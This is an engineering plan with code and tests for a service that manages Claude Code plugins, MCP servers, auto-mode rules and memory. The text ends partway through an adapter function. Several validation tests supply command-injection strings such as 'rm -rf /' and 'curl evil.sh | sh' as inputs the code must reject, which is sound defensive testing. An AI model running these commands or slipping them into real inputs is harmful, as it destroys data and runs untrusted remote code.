# Claude Code Config Management — Implementation Plan

**Goal:** Manage the whole per-machine `~/.claude` surface — plugins, MCP servers, auto-mode config, and memory — from Anvil's UI on every box in the fleet, with a diff-based sync for the declarative domains and no terminal anywhere.
**Architecture:** Thin adapters shell out to Claude Code's non-interactive subcommands (`claude plugin … --json`, `claude mcp …`, `claude auto-mode …`) and to the filesystem for memory; one P7-style domain service (`CcConfigService`) owns all four domains; REST lands in the existing `/api/cc/v1` route table behind a new `cc-config` capability; the web client gets a Settings → Claude Code area with four sections and a per-item sync diff.
**Tech Stack:** Bun/TypeScript, `bun:test`, vanilla-TS web client, jsdom for DOM tests.

**Design:** [`2026-08-15-claude-code-config-management-design.md`](2026-08-15-claude-code-config-management-design.md) (approved, commit `4a1fa89`).

**GATES:** none. cc-cli-transport plans 1–9 are merged to `main`; upstream is synced through PR #199.

## Status

| Task | Description | Status | Tested | Pushed |
|------|-------------|--------|--------|--------|
| 1 | Plugin list fixtures | pending | no | no |
| 2 | `src/cc/plugins.ts` types + `parsePluginList` | pending | no | no |
| 3 | Plugin read commands | pending | no | no |
| 4 | Plugin write commands | pending | no | no |
| 5 | Marketplace commands | pending | no | no |
| 6 | Tolerant `claude mcp list` parser | pending | no | no |
| 7 | MCP commands | pending | no | no |
| 8 | Auto-mode fixtures | pending | no | no |
| 9 | `src/cc/automode.ts` read + `$defaults` splice | pending | no | no |
| 10 | Auto-mode write + critique + reset | pending | no | no |
| 11 | `src/cc/memory.ts` list/read + path confinement + budget | pending | no | no |
| 12 | Memory write/delete + stale-write rejection | pending | no | no |
| 13 | Memory settings (`autoMemoryEnabled`, `autoMemoryDirectory`) | pending | no | no |
| 14 | `cc-config` capability + contract test | pending | no | no |
| 15 | `CcConfigService` + Deps guard test | pending | no | no |
| 16 | Wire the service into the server | pending | no | no |
| 17 | REST read routes (4 domains) | pending | no | no |
| 18 | REST write routes + job progress | pending | no | no |
| 19 | Protocol: `PermissionMode` gains `auto`/`dontAsk` + golden regen | **done** | yes | no |
| 20 | `auto` becomes the new-session default | **done** (widened, see note) | yes | no |
| 21 | Sync diff computation (plugins, MCP, autoMode) | pending | no | no |
| 22 | Sync REST endpoint | pending | no | no |
| 23 | Web: `ccconfig.ts` seam + Settings section shell | pending | no | no |
| 24 | Web: plugin + MCP rendering and actions | pending | no | no |
| 25 | Web: auto-mode editor with `$defaults` guard | pending | no | no |
| 26 | Web: memory browser/editor | pending | no | no |
| 27 | Web: sync diff UI | pending | no | no |
| 28 | Web DOM tests | pending | no | no |
| 29 | Docs: ARCHITECTURE + SECURITY | pending | no | no |
| 30 | Live pass on hub + one member | **partial**: `permissions.ask` proven (probe-auto-ask.ts); domains pending | partial | no |

---

## Ground rules for the executing engineer

Read these once; they apply to every task.

- **All commands run from `anvild/`** unless stated otherwise.
- **Never mutate the developer's real `~/.claude`.** Every automated test that invokes an adapter must
  point `HOME` at a temp dir, or inject a fake `CommandRunner`. **There is no exception.** This matters
  more here than it did for plugins alone: the memory tasks write to a memory directory, and the
  developer's real memory is irreplaceable.
- **Reuse, don't reinvent.** `CommandRunner` and `defaultRun` already exist in `src/cc/install.ts`;
  `resolveCcCommand(env)` resolves the CC binary. Import them. The exact signature is:
  ```ts
  export type CommandRunner = (
    cmd: string[],
    opts?: { cwd?: string; env?: Record<string, string>; timeoutMs?: number },
  ) => Promise<{ code: number; out: string }>;
  ```
  Note `out` is **merged stdout+stderr**, already trimmed.
- After each task: `bun run typecheck` must pass. After web tasks also `bun run typecheck:web` **and**
  `bun run build:web` (the daemon serves `web/dist`, not the source).
- Commit after each task with the message given.

### Self-contained

Every task below carries its complete code. This plan absorbed the tasks of the earlier
plugin/MCP plan, which has since been deleted — there is nothing else to go and read.

---

### Execution note — Tasks 19/20 (2026-08-16)

**Task 20 shipped wider than written.** The plan listed only `dialogs.ts` + the turn-runner fallback,
but the supervisor stamps a concrete mode onto every session record at create time, so that fallback
is nearly unreachable and changing it alone would have moved nothing. The default was switched at
every creation path: `supervisor.ts` (`session.create` + the default "Claude" session),
`autopilot-service.ts` (build session), and `default-tools.ts` — whose hand-copied zod enum would have
**rejected** `"auto"` outright, making the new default unreachable from the `session_handoff` MCP tool.
That enum now derives from `PERMISSION_MODES`. Also retargeted `outbox.ts`'s legacy
`mostly-autonomous → bypassPermissions` mapping to `auto`, which is the mapping D-6 exists to correct.

**Two deliberate non-changes**, pinned by tests so a later sweep does not "fix" them: autopilot's
*planning* session stays `default` (it exists to ask the open questions), and `dontAsk` does not
auto-approve team plans.

**`team-gate.ts` had to change with it.** `shouldAutoApprove` gated on `bypassPermissions` alone, so
making `auto` the default would have silently turned every team lead's decomposition into an approval
card. `auto` now auto-approves too.

**Task 19 was a no-op for the golden** — the union is a string field on existing envelopes, so the
regenerated `protocol-surface.golden.json` is byte-identical (v5, 150 wire types). Note the plan's
predicted "web typecheck break as a missed-picker-site detector" does **not** fire: the picker is an
HTML string, not an exhaustive typed switch. Audit picker sites by hand.

**CC 2.1.233 renamed `default` → `manual`** in `--permission-mode`'s choices list but still accepts
`default`; verified live. The wire keeps `default`, so stored sessions and old clients stay valid.

**Task 30's `permissions.ask` check is done, and automated** — `anvild/test/tools/probe-auto-ask.ts`
proves the composition against a real local remote: an ask-matched `git push` reaches
`mcp__anvild__approve`; deny leaves the remote at 0 commits; allow lets the push land; an auto-allowed
command still never prompts. The remaining Task 30 work is the four config domains and the fleet sync,
which need the adapter chains first.

---

## Task 1: Plugin list fixtures

**Files:**
- Create: `anvild/test/fixtures/cc/plugin-list.json`
- Create: `anvild/test/fixtures/cc/plugin-list-empty.json`

**Step 1: Capture from the real CLI**

Run (from anywhere):

```bash
claude plugin list --json > anvild/test/fixtures/cc/plugin-list.json
echo '[]' > anvild/test/fixtures/cc/plugin-list-empty.json
```

**Step 2: Scrub anything machine-specific**

Open `plugin-list.json` and replace absolute paths under `installPath` with `/home/testuser/.claude/plugins/...`. Keep at least three entries, including one with a populated `mcpServers` object and one with `"version": "unknown"`.

**Step 3: Verify shape**

Run: `bun -e 'const a=require("./test/fixtures/cc/plugin-list.json"); console.log(a.length, Object.keys(a[0]).sort().join(","))'`
Expected: a count ≥ 3 and keys including `enabled,id,installPath,installedAt,mcpServers,scope,version`.

**Step 4: Commit**

`git commit -m "test(cc-config): golden claude plugin list --json fixtures"`

---

## Task 2: `src/cc/plugins.ts` types + `parsePluginList`

**Files:**
- Create: `anvild/src/cc/plugins.ts`
- Create: `anvild/test/unit/cc-plugins.test.ts`

**Step 1: Write failing test**

`anvild/test/unit/cc-plugins.test.ts`:

```ts
/**
 * The CC plugin adapter. Reads go through `claude plugin list --json`, which is a supported,
 * documented contract — so the parser's job is to be strict about the fields we depend on and
 * tolerant about everything else (new fields must not break us).
 */
import { test, expect } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { parsePluginList } from "../../src/cc/plugins";

const fixture = (name: string): string => readFileSync(join(import.meta.dir, "../fixtures/cc", name), "utf8");

test("parses the real CLI's plugin list", () => {
  const out = parsePluginList(fixture("plugin-list.json"));
  expect(out.length).toBeGreaterThanOrEqual(3);
  const first = out[0]!;
  expect(typeof first.id).toBe("string");
  expect(typeof first.enabled).toBe("boolean");
  expect(first.name.length).toBeGreaterThan(0);
  expect(first.marketplace.length).toBeGreaterThan(0);
});

test("splits id into name@marketplace", () => {
  const out = parsePluginList(JSON.stringify([{ id: "episodic-memory@superpowers", version: "1.0.15", enabled: true, scope: "user" }]));
  expect(out[0]).toMatchObject({ name: "episodic-memory", marketplace: "superpowers", version: "1.0.15", enabled: true, scope: "user" });
});

test("an id with no marketplace still yields a usable name", () => {
  const out = parsePluginList(JSON.stringify([{ id: "local-thing", enabled: false }]));
  expect(out[0]).toMatchObject({ name: "local-thing", marketplace: "", enabled: false });
});

test("empty list parses to []", () => {
  expect(parsePluginList(fixture("plugin-list-empty.json"))).toEqual([]);
});

test("unknown extra fields are ignored, not fatal", () => {
  const out = parsePluginList(JSON.stringify([{ id: "a@b", enabled: true, somethingNew: { nested: 1 } }]));
  expect(out).toHaveLength(1);
});

test("garbage input throws a clear error rather than yielding junk", () => {
  expect(() => parsePluginList("not json")).toThrow(/plugin list/i);
  expect(() => parsePluginList('{"not":"an array"}')).toThrow(/plugin list/i);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: FAIL — `Cannot find module '../../src/cc/plugins'`.

**Step 3: Implement**

`anvild/src/cc/plugins.ts`:

```ts
/**
 * Adapter over Claude Code's non-interactive plugin/marketplace CLI.
 *
 * Anvil never edits `~/.claude` directly: marketplace resolution, dependency pruning, cache layout
 * and version pinning stay the CLI's job (design §3.3). This module is the only place that knows
 * the command lines, and it exposes a CLOSED set of operations — there is deliberately no
 * "run any claude subcommand" escape hatch for a client to reach.
 */
import { defaultRun, resolveCcCommand, type CommandRunner } from "./install";

/** One installed plugin, normalised from `claude plugin list --json`. */
export interface PluginInfo {
  /** The CLI's own identifier, `name@marketplace` — pass this back verbatim to write commands. */
  id: string;
  name: string;
  marketplace: string;
  version: string;
  enabled: boolean;
  scope: string;
  installPath?: string;
  /** Servers this plugin brings with it (already structured in the CLI's JSON). */
  mcpServers: string[];
}

export interface PluginCliOpts {
  /** Injected in tests; defaults to the real Bun spawn runner. */
  run?: CommandRunner;
  /** Env for the child (tests point HOME at a temp dir). Defaults to the daemon's own env. */
  env?: Record<string, string | undefined>;
  timeoutMs?: number;
}

const DEFAULT_TIMEOUT_MS = 120_000;

/** Split `name@marketplace`; a bare id keeps its name and reports an empty marketplace. */
function splitId(id: string): { name: string; marketplace: string } {
  const at = id.lastIndexOf("@");
  return at > 0 ? { name: id.slice(0, at), marketplace: id.slice(at + 1) } : { name: id, marketplace: "" };
}

/** Parse `claude plugin list --json`. Strict about the fields we use, tolerant of new ones. */
export function parsePluginList(raw: string): PluginInfo[] {
  let data: unknown;
  try {
    data = JSON.parse(raw);
  } catch {
    throw new Error(`could not parse plugin list output as JSON: ${raw.slice(0, 200)}`);
  }
  if (!Array.isArray(data)) throw new Error("plugin list output was not a JSON array");
  return data.map((row) => {
    const r = (row ?? {}) as Record<string, unknown>;
    const id = String(r.id ?? "");
    const { name, marketplace } = splitId(id);
    const servers = r.mcpServers && typeof r.mcpServers === "object" ? Object.keys(r.mcpServers as object) : [];
    return {
      id,
      name,
      marketplace,
      version: typeof r.version === "string" ? r.version : "unknown",
      enabled: r.enabled !== false,
      scope: typeof r.scope === "string" ? r.scope : "user",
      ...(typeof r.installPath === "string" ? { installPath: r.installPath } : {}),
      mcpServers: servers,
    };
  });
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: PASS (6 tests).

**Step 5: Commit**

`git commit -m "feat(cc-config): CC plugin adapter types + list parser"`

---

## Task 3: Plugin read commands

**Files:**
- Modify: `anvild/src/cc/plugins.ts` (append)
- Modify: `anvild/test/unit/cc-plugins.test.ts` (append)

**Step 1: Write failing test** — append:

```ts
import { listPlugins, listAvailablePlugins } from "../../src/cc/plugins";
import type { CommandRunner } from "../../src/cc/install";

function recorder(out: string, code = 0) {
  const calls: string[][] = [];
  const run: CommandRunner = async (cmd) => (calls.push(cmd), { code, out });
  return { run, calls };
}

test("listPlugins shells out to `plugin list --json` and parses", async () => {
  const { run, calls } = recorder(fixture("plugin-list.json"));
  const out = await listPlugins({ run });
  expect(out.length).toBeGreaterThanOrEqual(3);
  expect(calls[0]!.slice(1)).toEqual(["plugin", "list", "--json"]);
});

test("listAvailablePlugins asks for the marketplace catalogue", async () => {
  const { run, calls } = recorder("[]");
  await listAvailablePlugins({ run });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "list", "--available", "--json"]);
});

test("a nonzero exit surfaces the CLI's own message", async () => {
  const { run } = recorder("marketplace unreachable", 1);
  await expect(listPlugins({ run })).rejects.toThrow(/marketplace unreachable/);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: FAIL — `listPlugins` is not exported.

**Step 3: Implement** — append to `src/cc/plugins.ts`:

```ts
/** Run one `claude …` subcommand, returning trimmed merged output. Throws on nonzero exit. */
async function cc(args: string[], opts: PluginCliOpts): Promise<string> {
  const env = opts.env ?? process.env;
  const cmd = [...resolveCcCommand(env), ...args];
  const runner = opts.run ?? defaultRun;
  const { code, out } = await runner(cmd, {
    timeoutMs: opts.timeoutMs ?? DEFAULT_TIMEOUT_MS,
    ...(opts.env ? { env: opts.env as Record<string, string> } : {}),
  });
  // The CLI's own stderr is the most useful thing we can show a user, so pass it through rather
  // than inventing a message (design §7).
  if (code !== 0) throw new Error(out || `claude ${args.join(" ")} exited ${code}`);
  return out;
}

export const listPlugins = async (opts: PluginCliOpts = {}): Promise<PluginInfo[]> =>
  parsePluginList(await cc(["plugin", "list", "--json"], opts));

export const listAvailablePlugins = async (opts: PluginCliOpts = {}): Promise<PluginInfo[]> =>
  parsePluginList(await cc(["plugin", "list", "--available", "--json"], opts));
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: PASS (9 tests).

**Step 5: Commit**

`git commit -m "feat(cc-config): listPlugins/listAvailablePlugins over the CC CLI"`

---

## Task 4: Plugin write commands

**Files:**
- Modify: `anvild/src/cc/plugins.ts` (append)
- Modify: `anvild/test/unit/cc-plugins.test.ts` (append)

**Step 1: Write failing test** — append:

```ts
import { pluginOp, type PluginOp } from "../../src/cc/plugins";

test("install passes -y (required when stdin/stdout is not a TTY) and the scope", async () => {
  const { run, calls } = recorder("installed");
  await pluginOp("install", "superwisdom@seiraiyu", { run, scope: "user" });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "install", "superwisdom@seiraiyu", "--yes", "--scope", "user"]);
});

test("enable/disable/uninstall/update pass the id through unchanged", async () => {
  for (const op of ["enable", "disable", "uninstall", "update"] as PluginOp[]) {
    const { run, calls } = recorder("ok");
    await pluginOp(op, "a@b", { run });
    expect(calls[0]!.slice(1)).toEqual(["plugin", op, "a@b"]);
  }
});

test("an unknown op is refused before anything is spawned (closed operation set)", async () => {
  const { run, calls } = recorder("ok");
  await expect(pluginOp("rm -rf /" as PluginOp, "x", { run })).rejects.toThrow(/unsupported/i);
  expect(calls).toHaveLength(0);
});

test("a plugin id containing shell metacharacters is rejected, not escaped", async () => {
  const { run, calls } = recorder("ok");
  await expect(pluginOp("install", "a@b; rm -rf /", { run })).rejects.toThrow(/invalid plugin id/i);
  expect(calls).toHaveLength(0);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: FAIL — `pluginOp` is not exported.

**Step 3: Implement** — append to `src/cc/plugins.ts`:

```ts
/** The closed set of plugin mutations Anvil exposes. Anything else is refused. */
export type PluginOp = "install" | "uninstall" | "enable" | "disable" | "update";
const PLUGIN_OPS: readonly PluginOp[] = ["install", "uninstall", "enable", "disable", "update"];

/** Plugin ids are `name@marketplace` — letters, digits and a small punctuation set. We REJECT
 *  anything else rather than trying to escape it: there is no legitimate id with a shell
 *  metacharacter, and rejecting keeps this impossible to turn into command injection. */
const SAFE_ID = /^[A-Za-z0-9._@/-]{1,200}$/;

export interface PluginOpOpts extends PluginCliOpts {
  /** `user` (default), `project` or `local` — the CLI's own scopes. */
  scope?: string;
}

export async function pluginOp(op: PluginOp, id: string, opts: PluginOpOpts = {}): Promise<string> {
  if (!PLUGIN_OPS.includes(op)) throw new Error(`unsupported plugin operation: ${op}`);
  if (!SAFE_ID.test(id)) throw new Error(`invalid plugin id: ${id}`);
  const args = ["plugin", op, id];
  // `-y` is REQUIRED for a marketplace-declared install command when stdin/stdout is not a TTY,
  // which is always true for us. Only install prompts, so only install gets it.
  if (op === "install") {
    args.push("--yes");
    if (opts.scope) args.push("--scope", opts.scope);
  }
  return cc(args, opts);
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: PASS (13 tests).

**Step 5: Commit**

`git commit -m "feat(cc-config): closed-set plugin mutations with id validation"`

---

## Task 5: Marketplace commands

**Files:**
- Modify: `anvild/src/cc/plugins.ts`, `anvild/test/unit/cc-plugins.test.ts`

**Step 1: Write failing test** — append:

```ts
import { listMarketplaces, marketplaceOp } from "../../src/cc/plugins";

test("marketplace list is requested as JSON", async () => {
  const { run, calls } = recorder("[]");
  await listMarketplaces({ run });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "marketplace", "list", "--json"]);
});

test("marketplace add/remove/update pass the source through", async () => {
  const { run, calls } = recorder("ok");
  await marketplaceOp("add", "org/repo", { run });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "marketplace", "add", "org/repo"]);
});

test("marketplace ops reject an unsafe source", async () => {
  const { run, calls } = recorder("ok");
  await expect(marketplaceOp("add", "x; curl evil.sh | sh", { run })).rejects.toThrow(/invalid marketplace/i);
  expect(calls).toHaveLength(0);
});
```

**Step 2: Run, verify failure.** Run: `bun test test/unit/cc-plugins.test.ts` → FAIL.

**Step 3: Implement** — append:

```ts
export type MarketplaceOp = "add" | "remove" | "update";
const MARKETPLACE_OPS: readonly MarketplaceOp[] = ["add", "remove", "update"];
/** A marketplace source is a URL, a path, or `owner/repo` — same reject-don't-escape rule as ids. */
const SAFE_SOURCE = /^[A-Za-z0-9._:@/~-]{1,400}$/;

/** Marketplaces are listed as raw JSON text; callers hand it straight to the client. */
export const listMarketplaces = async (opts: PluginCliOpts = {}): Promise<unknown> => {
  const raw = await cc(["plugin", "marketplace", "list", "--json"], opts);
  try {
    return JSON.parse(raw);
  } catch {
    return [];
  }
};

export async function marketplaceOp(op: MarketplaceOp, source: string, opts: PluginCliOpts = {}): Promise<string> {
  if (!MARKETPLACE_OPS.includes(op)) throw new Error(`unsupported marketplace operation: ${op}`);
  if (!SAFE_SOURCE.test(source)) throw new Error(`invalid marketplace source: ${source}`);
  return cc(["plugin", "marketplace", op, source], opts);
}
```

**Step 4: Run, verify pass.** Expected: PASS (16 tests).

**Step 5: Commit** — `git commit -m "feat(cc-config): marketplace list/add/remove/update"`

---

## Task 6: Tolerant `claude mcp list` parser

`claude mcp list` has **no `--json`** (verified 2026-08-14), so this is the one place we parse human
output. The parser must degrade, never throw — a format change should show raw text, not break the page.

**Files:**
- Create: `anvild/src/cc/mcp.ts`
- Create: `anvild/test/unit/cc-mcp.test.ts`

**Step 1: Write failing test**

```ts
/**
 * `claude mcp list` is text-only (no --json), so this parser is a KNOWN maintenance point
 * (design §4.3). Its contract is therefore: extract what it can, and degrade to `raw` for any
 * line it does not understand — never throw, because a CLI format change must not break the page.
 */
import { test, expect } from "bun:test";
import { parseMcpList } from "../../src/cc/mcp";

const REAL = `Checking MCP server health…

claude.ai Google Drive: https://drivemcp.googleapis.com/mcp/v1 - ✔ Connected
claude.ai Gmail: https://gmailmcp.googleapis.com/mcp/v1 - ✘ Failed to connect
plugin:episodic-memory:episodic-memory: node /home/u/.claude/x.js - ✔ Connected`;

test("parses the real output into name/target/status", () => {
  const out = parseMcpList(REAL);
  expect(out).toHaveLength(3);
  expect(out[0]).toMatchObject({ name: "claude.ai Google Drive", target: "https://drivemcp.googleapis.com/mcp/v1", connected: true });
  expect(out[1]!.connected).toBe(false);
  expect(out[2]!.name).toBe("plugin:episodic-memory:episodic-memory");
});

test("the health-check header and blank lines are skipped", () => {
  expect(parseMcpList(REAL).some((s) => /Checking MCP/.test(s.name))).toBe(false);
});

test("an unrecognised line is preserved as raw rather than dropped or thrown", () => {
  const out = parseMcpList("something entirely new\n");
  expect(out).toHaveLength(1);
  expect(out[0]).toMatchObject({ name: "something entirely new", raw: true, connected: false });
});

test("empty output is an empty list", () => {
  expect(parseMcpList("")).toEqual([]);
  expect(parseMcpList("Checking MCP server health…\n")).toEqual([]);
});
```

**Step 2: Run, verify failure.** `bun test test/unit/cc-mcp.test.ts` → FAIL (module not found).

**Step 3: Implement** `anvild/src/cc/mcp.ts`:

```ts
/**
 * Adapter over `claude mcp …`.
 *
 * Writes (`add`/`remove`) are clean, supported, non-interactive. READS are the awkward half:
 * `claude mcp list` and `mcp get` have no `--json`, so §4.3 prefers structured sources —
 * `init.mcp_servers` from any turn, and the `mcpServers` field of `claude plugin list --json` —
 * and falls back to this tolerant parser only for user-added servers.
 */
import { defaultRun, resolveCcCommand, type CommandRunner } from "./install";

export interface McpServerInfo {
  name: string;
  target?: string;
  connected: boolean;
  /** True when the line could not be parsed — shown verbatim rather than dropped. */
  raw?: boolean;
}

export interface McpCliOpts {
  run?: CommandRunner;
  env?: Record<string, string | undefined>;
  timeoutMs?: number;
}

const SKIP = /^\s*$|^Checking MCP server health/i;

/** Lines look like `name: target - ✔ Connected`. Anything else is kept as a raw row. */
export function parseMcpList(out: string): McpServerInfo[] {
  const rows: McpServerInfo[] = [];
  for (const line of out.split("\n")) {
    if (SKIP.test(line)) continue;
    const text = line.trim();
    if (!text) continue;
    const m = /^(.+?):\s+(.*?)\s+-\s+(.*)$/.exec(text);
    if (!m) {
      rows.push({ name: text, connected: false, raw: true });
      continue;
    }
    rows.push({ name: m[1]!.trim(), target: m[2]!.trim(), connected: /connected/i.test(m[3]!) && !/fail|error/i.test(m[3]!) });
  }
  return rows;
}
```

**Step 4: Run, verify pass.** Expected: PASS (4 tests).

**Step 5: Commit** — `git commit -m "feat(mcp): tolerant claude mcp list parser"`

---

## Task 7: MCP commands

**Files:** modify `anvild/src/cc/mcp.ts`, `anvild/test/unit/cc-mcp.test.ts`

**Step 1: Write failing test** — append:

```ts
import { listMcpServers, addMcpServer, removeMcpServer } from "../../src/cc/mcp";
import type { CommandRunner } from "../../src/cc/install";

const rec = (out: string, code = 0) => {
  const calls: string[][] = [];
  const run: CommandRunner = async (cmd) => (calls.push(cmd), { code, out });
  return { run, calls };
};

test("listMcpServers shells out and parses", async () => {
  const { run, calls } = rec(REAL);
  expect(await listMcpServers({ run })).toHaveLength(3);
  expect(calls[0]!.slice(1)).toEqual(["mcp", "list"]);
});

test("addMcpServer uses add-json so the config is passed structurally, not as shell words", async () => {
  const { run, calls } = rec("added");
  await addMcpServer("sentry", { type: "http", url: "https://mcp.sentry.dev/mcp" }, { run });
  expect(calls[0]!.slice(1, 4)).toEqual(["mcp", "add-json", "sentry"]);
  expect(JSON.parse(calls[0]![4]!)).toMatchObject({ type: "http", url: "https://mcp.sentry.dev/mcp" });
});

test("server names are validated", async () => {
  const { run, calls } = rec("ok");
  await expect(removeMcpServer("a; rm -rf /", { run })).rejects.toThrow(/invalid mcp server name/i);
  expect(calls).toHaveLength(0);
});
```

**Step 2: Run, verify failure.**

**Step 3: Implement** — append to `src/cc/mcp.ts`:

```ts
const SAFE_NAME = /^[A-Za-z0-9 ._:@/-]{1,120}$/;
const DEFAULT_TIMEOUT_MS = 60_000;

async function cc(args: string[], opts: McpCliOpts): Promise<string> {
  const env = opts.env ?? process.env;
  const cmd = [...resolveCcCommand(env), ...args];
  const { code, out } = await (opts.run ?? defaultRun)(cmd, {
    timeoutMs: opts.timeoutMs ?? DEFAULT_TIMEOUT_MS,
    ...(opts.env ? { env: opts.env as Record<string, string> } : {}),
  });
  if (code !== 0) throw new Error(out || `claude ${args.join(" ")} exited ${code}`);
  return out;
}

export const listMcpServers = async (opts: McpCliOpts = {}): Promise<McpServerInfo[]> => parseMcpList(await cc(["mcp", "list"], opts));

/** `add-json` takes the whole server config as one JSON argument — no shell-word splitting of
 *  commands, args, headers or env, which is what makes this safe to drive from a UI. */
export async function addMcpServer(name: string, config: Record<string, unknown>, opts: McpCliOpts = {}): Promise<string> {
  if (!SAFE_NAME.test(name)) throw new Error(`invalid mcp server name: ${name}`);
  return cc(["mcp", "add-json", name, JSON.stringify(config)], opts);
}

export async function removeMcpServer(name: string, opts: McpCliOpts = {}): Promise<string> {
  if (!SAFE_NAME.test(name)) throw new Error(`invalid mcp server name: ${name}`);
  return cc(["mcp", "remove", name], opts);
}
```

**Step 4: Run, verify pass.** Expected: PASS (7 tests).

**Step 5: Commit** — `git commit -m "feat(mcp): list/add/remove over the CC CLI"`

---

## Task 8: Auto-mode fixtures

**Files:**
- Create: `anvild/test/fixtures/cc/automode-defaults.json`
- Create: `anvild/test/fixtures/cc/automode-config.json`

**Step 1: Capture from the real CLI**

```bash
claude auto-mode defaults > anvild/test/fixtures/cc/automode-defaults.json
claude auto-mode config   > anvild/test/fixtures/cc/automode-config.json
```

**Step 2: Trim**

Both files are large. Keep the four top-level keys (`allow`, `soft_deny`, `hard_deny`, `environment`)
but trim each array to its first 3 entries — the parser cares about shape, not volume. Do not
reformat the strings; they are prose and must stay verbatim so the test proves we pass them through
untouched.

**Step 3: Verify shape**

Run: `bun -e 'const d=require("./test/fixtures/cc/automode-defaults.json"); console.log(Object.keys(d).sort().join(","), Array.isArray(d.soft_deny))'`
Expected: `allow,environment,hard_deny,soft_deny true`

**Step 4: Commit**

`git commit -m "test(cc-config): claude auto-mode defaults/config fixtures"`

---

## Task 9: `src/cc/automode.ts` read + `$defaults` splice

**Files:**
- Create: `anvild/src/cc/automode.ts`
- Create: `anvild/test/unit/cc-automode.test.ts`

**Step 1: Write failing test**

`anvild/test/unit/cc-automode.test.ts`:

```ts
/**
 * The auto-mode adapter (cc-config design §6.5). `claude auto-mode config|defaults` are
 * non-interactive JSON, so reads are a straight parse. The `$defaults` splice is the dangerous part:
 * an array WITHOUT the literal "$defaults" silently discards CC's entire built-in list for that
 * section, so `splicedPreview` exists to show a user exactly what their edit would produce.
 */
import { test, expect } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { parseAutoModeConfig, splicedPreview, hasDefaultsSentinel, AUTOMODE_SECTIONS } from "../../src/cc/automode";

const fixture = (n: string): string => readFileSync(join(import.meta.dir, "../fixtures/cc", n), "utf8");

test("parses the real CLI's auto-mode config into the four sections", () => {
  const cfg = parseAutoModeConfig(fixture("automode-config.json"));
  for (const s of AUTOMODE_SECTIONS) expect(Array.isArray(cfg[s])).toBe(true);
  expect(cfg.soft_deny.length).toBeGreaterThan(0);
  expect(typeof cfg.soft_deny[0]).toBe("string"); // prose, passed through verbatim
});

test("a missing section parses as an empty array rather than undefined", () => {
  const cfg = parseAutoModeConfig(JSON.stringify({ allow: ["x"] }));
  expect(cfg.allow).toEqual(["x"]);
  expect(cfg.soft_deny).toEqual([]);
  expect(cfg.hard_deny).toEqual([]);
  expect(cfg.environment).toEqual([]);
});

test("garbage input throws rather than yielding a config that silently drops rules", () => {
  expect(() => parseAutoModeConfig("not json")).toThrow();
});

test("hasDefaultsSentinel detects the literal $defaults entry", () => {
  expect(hasDefaultsSentinel(["$defaults", "mine"])).toBe(true);
  expect(hasDefaultsSentinel(["mine"])).toBe(false);
  expect(hasDefaultsSentinel([])).toBe(false); // empty also discards the defaults
});

test("splicedPreview expands $defaults in place, preserving position", () => {
  const out = splicedPreview(["before", "$defaults", "after"], ["d1", "d2"]);
  expect(out).toEqual(["before", "d1", "d2", "after"]);
});

test("splicedPreview without the sentinel returns ONLY the user entries — the footgun", () => {
  const out = splicedPreview(["mine"], ["d1", "d2"]);
  expect(out).toEqual(["mine"]); // CC's built-ins are gone; the UI must warn on this
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-automode.test.ts`
Expected: FAIL with `Cannot find module '../../src/cc/automode'`

**Step 3: Implement**

`anvild/src/cc/automode.ts`:

```ts
/**
 * Auto-mode classifier configuration (cc-config design §6.5). Claude Code shipped `auto` as a
 * permission mode on 2026-08-14: a classifier blocks irreversible/destructive/exfiltrating actions.
 * The `autoMode` settings block tunes that classifier.
 *
 * Anvil reads the EFFECTIVE config through `claude auto-mode config` rather than reading
 * settings.json, because the effective value is the merge of user + managed + `--settings` scopes and
 * only the CLI knows that merge (design principle 1: never reimplement CC's logic).
 *
 * The `$defaults` sentinel is the sharp edge. Setting any section WITHOUT the literal "$defaults"
 * string replaces CC's entire built-in list for that section — silently. `splicedPreview` renders
 * what a given edit actually produces so the UI can show it, and `hasDefaultsSentinel` drives the
 * warning.
 */
import { resolveCcCommand, defaultRun, type CommandRunner } from "./install";

export const AUTOMODE_SECTIONS = ["allow", "soft_deny", "hard_deny", "environment"] as const;
export type AutoModeSection = (typeof AUTOMODE_SECTIONS)[number];

/** The four prose rule lists. Every entry is natural language, never a pattern — pass through verbatim. */
export type AutoModeConfig = Record<AutoModeSection, string[]>;

/** The literal string that splices CC's built-in rules into a user array at that position. */
export const DEFAULTS_SENTINEL = "$defaults";

const strings = (v: unknown): string[] =>
  Array.isArray(v) ? v.filter((x): x is string => typeof x === "string") : [];

/** Parse `claude auto-mode config|defaults` output. Throws on non-JSON: a silently-empty config
 *  would render as "no rules", which would misrepresent the machine's actual safety posture. */
export function parseAutoModeConfig(raw: string): AutoModeConfig {
  const j = JSON.parse(raw) as Record<string, unknown>;
  if (!j || typeof j !== "object") throw new Error("auto-mode config is not an object");
  return {
    allow: strings(j.allow),
    soft_deny: strings(j.soft_deny),
    hard_deny: strings(j.hard_deny),
    environment: strings(j.environment),
  };
}

/** True when the array will INHERIT CC's built-ins. An empty array does not — it discards them. */
export function hasDefaultsSentinel(entries: string[]): boolean {
  return entries.includes(DEFAULTS_SENTINEL);
}

/** What `entries` actually resolves to, with `defaults` spliced in at the sentinel's position.
 *  Without the sentinel the defaults are dropped entirely — that is CC's behavior, reproduced here
 *  so the UI can show the user the loss before they save. */
export function splicedPreview(entries: string[], defaults: string[]): string[] {
  const out: string[] = [];
  for (const e of entries) {
    if (e === DEFAULTS_SENTINEL) out.push(...defaults);
    else out.push(e);
  }
  return out;
}

async function ccAutoMode(
  args: string[],
  run: CommandRunner,
  env: Record<string, string | undefined>,
): Promise<string> {
  const cmd = resolveCcCommand(env);
